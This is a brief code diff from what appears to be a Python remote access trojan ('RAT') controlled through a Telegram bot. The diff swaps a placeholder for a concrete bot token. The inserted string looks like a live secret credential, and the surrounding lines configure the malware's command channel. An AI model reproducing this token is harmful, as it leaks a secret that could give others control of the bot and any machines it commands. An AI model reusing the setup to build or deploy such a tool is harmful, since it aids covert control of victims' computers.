@@ -26,7 +26,7 @@ import collections
 import urllib											# wallpaper	
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
-token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll' #(Token Here)
+token = '819228055:AAFmW22D1l0J-SvtFvA7pQsiIVXfBKZTV9c' #(Token Here)
 #token = os.environ['RAT_TOKEN'] 						# you can set your environment variable as well
 # This will be used for setting paths and related file io -- change to whatever you want
 app_name = 'Portal'
